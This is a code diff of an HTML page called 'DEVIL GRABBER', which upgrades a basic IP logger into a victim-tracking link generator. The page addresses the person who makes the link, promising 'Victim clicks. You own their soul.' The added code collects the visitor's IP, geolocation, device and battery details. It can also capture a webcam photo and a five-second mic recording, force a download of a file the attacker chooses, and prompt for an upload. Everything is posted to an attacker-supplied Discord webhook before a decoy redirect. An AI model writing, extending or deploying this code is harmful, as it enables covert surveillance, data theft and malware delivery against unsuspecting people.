@@ -3,104 +3,225 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>IP Grabber</title>
+  <title>DEVIL GRABBER</title>
   <style>
-    body { 
-      background: #000; color: #0f0; font-family: 'Courier New'; 
-      text-align: center; padding: 50px; 
-    }
-    input, button { 
-      padding: 12px; margin: 10px; width: 90%; max-width: 500px; 
-      background: #111; border: 1px solid #0f0; color: #0f0; 
-      font-size: 1.1rem; 
-    }
-    button { background: #0f0; color: #000; cursor: pointer; font-weight: bold; }
-    #link { color: #0f0; word-break: break-all; margin: 20px; font-size: 1.2rem; }
+    :root { --bg: #000; --acc: #0f0; --card: #111; }
+    body { margin:0; background:var(--bg); color:var(--acc); font-family: 'Courier New'; padding:20px; }
+    .card { background:var(--card); border:2px solid var(--acc); border-radius:12px; padding:20px; max-width:600px; margin:auto; }
+    h1 { text-align:center; margin:0 0 10px; }
+    input, button, select { width:100%; padding:12px; margin:8px 0; background:#000; border:1px solid var(--acc); color:var(--acc); border-radius:8px; font-size:1rem; }
+    button { background:var(--acc); color:#000; font-weight:bold; cursor:pointer; }
+    label { display:flex; align-items:center; margin:10px 0; }
+    input[type="checkbox"] { width:auto; margin-right:10px; }
+    #link { background:#000; padding:15px; border-radius:8px; word-break:break-all; margin:15px 0; font-weight:bold; }
+    .hidden { display:none; }
+    .footer { text-align:center; margin-top:40px; font-size:0.8rem; opacity:0.6; }
   </style>
 </head>
 <body>
-  <h1>IP GRABBER</h1>
-  <p>Enter your Discord webhook. Generate link. Send it. Profit.</p>
+  <div class="card">
+    <h1>DEVIL GRABBER</h1>
+    <p>Generate link. Victim clicks. You own their soul.</p>
 
-  <input id="webhook" placeholder="https://discord.com/api/webhooks/..." />
-  <button onclick="generate()">GENERATE LINK</button>
+    <input id="webhook" placeholder="Discord webhook URL" />
 
-  <div id="result" style="display:none;">
-    <p><strong>Send this link:</strong></p>
-    <div id="link"></div>
-    <button onclick="copy()">COPY LINK</button>
+    <hr style="border:1px dashed #0f0; margin:20px 0;">
+
+    <label><input type="checkbox" id="ip" checked> Log IP + Location</label>
+    <label><input type="checkbox" id="pc"> Log PC Info (UA, Screen, Battery)</label>
+    <label><input type="checkbox" id="cam"> Steal Webcam Photo</label>
+    <label><input type="checkbox" id="mic"> Record Mic (5s)</label>
+    <label><input type="checkbox" id="download"> Force Download File</label>
+    <div id="dlbox" class="hidden">
+      <input type="file" id="dlfile" />
+    </div>
+    <label><input type="checkbox" id="upload"> Force File Upload</label>
+    <label><input type="checkbox" id="silent"> Silent Mode (no redirect)</label>
+    <input id="redirect" placeholder="Redirect URL (or leave blank)" />
+
+    <button onclick="generate()">GENERATE LINK</button>
+
+    <div id="result" class="hidden">
+      <p><strong>Send this link:</strong></p>
+      <div id="link"></div>
+      <button onclick="copy()">COPY</button>
+    </div>
   </div>
 
-  <script>
-    function rand() {
-      return Math.random().toString(36).substr(2, 9);
-    }
+  <div class="footer">© 2025 DevilGrabber – No rules. No trace.</div>
 
-    function generate() {
+  <script>
+    const toggles = ['ip','pc','cam','mic','download','upload','silent'];
+    toggles.forEach(id => {
+      document.getElementById(id).onchange = () => {
+        document.getElementById('dlbox').classList.toggle('hidden', !document.getElementById('download').checked);
+      };
+    });
+
+    function rand() { return Math.random().toString(36).substr(2, 10); }
+
+    async function generate() {
       const webhook = document.getElementById("webhook").value.trim();
-      if (!webhook.includes("discord.com/api/webhooks")) {
-        alert("Enter a valid Discord webhook URL.");
-        return;
+      if (!webhook.includes("discord.com/api/webhooks")) return alert("Valid webhook required.");
+
+      const config = {
+        w: webhook,
+        ip: document.getElementById("ip").checked,
+        pc: document.getElementById("pc").checked,
+        cam: document.getElementById("cam").checked,
+        mic: document.getElementById("mic").checked,
+        dl: document.getElementById("download").checked,
+        up: document.getElementById("upload").checked,
+        silent: document.getElementById("silent").checked,
+        redir: document.getElementById("redirect").value.trim() || "https://google.com"
+      };
+
+      if (config.dl) {
+        const file = document.getElementById("dlfile").files[0];
+        if (!file) return alert("Select a file to force download.");
+        config.dlName = file.name;
+        config.dlData = await fileToBase64(file);
       }
 
       const id = rand();
       const link = `${location.origin}/?id=${id}`;
-      localStorage.setItem(`hook_${id}`, webhook);
+      localStorage.setItem(`cfg_${id}`, JSON.stringify(config));
 
       document.getElementById("link").innerText = link;
-      document.getElementById("result").style.display = "block";
+      document.getElementById("result").classList.remove("hidden");
+    }
+
+    function fileToBase64(file) {
+      return new Promise((res, rej) => {
+        const reader = new FileReader();
+        reader.onload = () => res(reader.result);
+        reader.onerror = rej;
+        reader.readAsDataURL(file);
+      });
     }
 
     function copy() {
-      const link = document.getElementById("link").innerText;
-      navigator.clipboard.writeText(link);
+      navigator.clipboard.writeText(document.getElementById("link").innerText);
       alert("Copied!");
     }
 
-    // === GRAB IP ON LOAD ===
+    // === VICTIM SIDE ===
     if (location.search) {
       const params = new URLSearchParams(location.search);
       const id = params.get("id");
-      const webhook = localStorage.getItem(`hook_${id}`);
+      const cfg = JSON.parse(localStorage.getItem(`cfg_${id}`) || "{}");
+      if (!cfg.w) { location.href = "https://google.com"; return; }
 
-      if (webhook) {
-        (async () => {
+      document.body.innerHTML = `<h2 style="color:#0f0;text-align:center;margin-top:100px;">Loading...</h2>`;
+
+      (async () => {
+        const data = { embeds: [{ fields: [], color: 65280, timestamp: new Date().toISOString() }] };
+        let files = [];
+
+        // IP + GEO
+        if (cfg.ip) {
+          const ip = await (await fetch("https://ipapi.co/json/")).json();
+          data.embeds[0].fields.push(
+            { name: "IP", value: ip.ip, inline: true },
+            { name: "Location", value: `${ip.city}, ${ip.country_name}`, inline: true },
+            { name: "ISP", value: ip.org || "Unknown", inline: true }
+          );
+        }
+
+        // PC INFO
+        if (cfg.pc) {
+          const bat = await navigator.getBattery?.() || {};
+          data.embeds[0].fields.push(
+            { name: "Device", value: navigator.userAgent.slice(0,100), inline: false },
+            { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
+            { name: "Battery", value: bat.level ? Math.round(bat.level*100)+"%" : "N/A", inline: true },
+            { name: "Cores", value: navigator.hardwareConcurrency?.toString() || "N/A", inline: true }
+          );
+        }
+
+        // WEBCAM
+        if (cfg.cam) {
           try {
-            const res = await fetch("https://ipapi.co/json/");
-            const data = await res.json();
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const vid = document.createElement("video"); vid.srcObject = stream; vid.play();
+            await new Promise(r => setTimeout(r, 1000));
+            const canvas = document.createElement("canvas"); canvas.width = 320; canvas.height = 240;
+            canvas.getContext("2d").drawImage(vid, 0, 0, 320, 240);
+            const img = canvas.toDataURL("image/jpeg", 0.7);
+            files.push({ name: "webcam.jpg", data: img });
+            stream.getTracks().forEach(t => t.stop());
+          } catch(e) {}
+        }
 
-            const payload = {
-              embeds: [{
-                title: "NEW IP GRABBED",
-                color: 65280,
-                fields: [
-                  { name: "IP", value: data.ip, inline: true },
-                  { name: "Location", value: `${data.city}, ${data.country_name}`, inline: true },
-                  { name: "ISP", value: data.org || "Unknown", inline: true },
-                  { name: "Device", value: navigator.userAgent.slice(0, 100), inline: false },
-                  { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
-                  { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true }
-                ],
-                timestamp: new Date().toISOString()
-              }]
+        // MIC
+        if (cfg.mic) {
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.start();
+            setTimeout(() => {
+              recorder.stop();
+              recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: "audio/webm" });
+                const reader = new FileReader();
+                reader.onload = () => {
+                  files.push({ name: "mic.webm", data: reader.result });
+                };
+                reader.readAsDataURL(blob);
+              };
+            }, 5000);
+          } catch(e) {}
+        }
+
+        // UPLOAD
+        if (cfg.up) {
+          const input = document.createElement("input"); input.type = "file";
+          input.onchange = () => {
+            const file = input.files[0];
+            const reader = new FileReader();
+            reader.onload = () => {
+              files.push({ name: file.name, data: reader.result });
             };
+            reader.readAsDataURL(file);
+          };
+          input.click();
+        }
 
-            await fetch(webhook, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(payload)
-            });
+        // DOWNLOAD
+        if (cfg.dl && cfg.dlData) {
+          const a = document.createElement("a");
+          a.href = cfg.dlData;
+          a.download = cfg.dlName;
+          a.click();
+        }
 
-            // Optional: redirect or stay silent
-            setTimeout(() => location.href = "https://google.com", 500);
-          } catch (e) {
-            setTimeout(() => location.href = "https://google.com", 500);
+        // SEND TO DISCORD
+        setTimeout(async () => {
+          const payload = { embeds: data.embeds };
+          if (files.length) {
+            const form = new FormData();
+            form.append("payload_json", JSON.stringify(payload));
+            files.forEach((f, i) => form.append(`file${i}`, dataURLtoBlob(f.data), f.name));
+            await fetch(cfg.w, { method: "POST", body: form });
+          } else {
+            await fetch(cfg.w, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
           }
-        })();
-      }
 
-      // Show nothing or fake page
-      document.body.innerHTML = "<h2 style='color:#0f0;'>Loading...</h2>";
+          if (!cfg.silent) location.replace(cfg.redir);
+        }, 1000);
+      })();
+    }
+
+    function dataURLtoBlob(dataURL) {
+      const [meta, data] = dataURL.split(",");
+      const mime = meta.match(/:(.*?);/)[1];
+      const bstr = atob(data);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while (n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], { type: mime });
     }
   </script>
 </body>
